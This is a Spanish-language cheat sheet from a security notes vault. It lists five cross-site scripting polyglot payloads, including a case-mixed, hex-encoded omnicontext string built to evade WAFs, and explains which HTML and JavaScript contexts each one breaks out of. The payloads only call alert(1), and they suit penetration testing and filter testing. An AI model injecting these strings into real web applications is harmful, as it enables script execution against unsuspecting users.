---
aliases:
tags:
  - type/cheatsheet
  - vuln/xss
  - technique/execution
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
type: CheatSheet
linked:
  - "[[Cross-Site Scripting (XSS)]]"
---
# XSS - Payloads Polyglot

***

## Cheatsheet

|                                                         **Vector / Payload Polyglot**                                                          |                          **Contextos Neutralizados**                           |                                                                                                                                 **Análisis de la Estructura**                                                                                                                                  |
| :--------------------------------------------------------------------------------------------------------------------------------------------: | :----------------------------------------------------------------------------: | :--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------: |
|                                                    <br><br>`'">><script>alert(1)</script>`                                                     |           <br><br>Atributos (`"`, `'`), Etiquetas abiertas.<br><br>            |                                   <br>El payload básico. Inyecta comillas dobles y simples para cerrar cualquier atributo en el que aterrice, seguido de `>>` para asegurar el cierre de la etiqueta anfitriona antes de abrir el bloque de script.<br><br>                                    |
|                              <br><br>`-->` `</textarea></style></title></script>` `<svg/onload=alert(1)>`<br><br>                              |      <br>Comentarios HTML, Bloques de texto plano, Etiquetas protectoras.      |                                        <br>Cierra prematuramente comentarios HTML (`-->`) y todas las etiquetas comunes que bloquean la ejecución de código (tratando el contenido como texto). Finalmente inyecta un vector basado en eventos.<br><br>                                        |
|                                    <br><br>`javascript://%250Aalert(1)//"undefined"==typeof action&&a=="'`                                     | <br>Atributos de URL (`href`, `src`), Bloques JavaScript (`<script>`).<br><br> |                               <br>Opera como un esquema válido si aterriza en un enlace. El `%250A` (doble URL encode de un salto de línea) y los comentarios `//` aseguran que la sintaxis de JavaScript no se rompa si se refleja dentro de una variable.<br>                                |
|                                                    <br><br>`";alert(1);//` `';alert(1);//`                                                     |                    <br><br>Variables JavaScript explícitas.                    |         <br>Diseñado para reflejos dentro de bloques `<script>` legítimos. Rompe cadenas envueltas en comillas simples o dobles, finaliza la declaración con `;`, ejecuta la alerta y comenta cualquier sintaxis residual que pueda generar errores fatales en el intérprete.<br><br>          |
| <br><br>`jaVasCript:/*-/*\`/_`/_'/_"/**/(/_ */oNcliCk=alert(1) )//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(1)//>\x3e` |           <br>Omnicontexto (Polyglot avanzado, derivado de 0xsobky).           | <br>Cubre atributos, pseudo-protocolos, scripts en línea, comentarios modernos (`--!>`), bloqueadores de texto y evasión de filtros sensibles a mayúsculas. Emplea codificación hexadecimal (`\x3c` para `<`) para evadir WAFs básicos que bloquean la apertura de etiquetas estándar.<br><br> |
^xss-polyglot

___

## Overview

Un payload Polyglot es una cadena de inyección multipropósito, construida meticulosamente para ejecutarse de forma simultánea en múltiples contextos de renderizado (HTML base, atributos con comillas simples o dobles, bloques de JavaScript, áreas de texto, comentarios).

El objetivo de utilizar este vector es lograr la ejecución directa del script malicioso a ciegas, forzando la ruptura de múltiples barreras sintácticas al mismo tiempo, sin necesidad de conocer de antemano el punto exacto de reflexión en el código fuente ni los caracteres de escape específicos que requiere el entorno.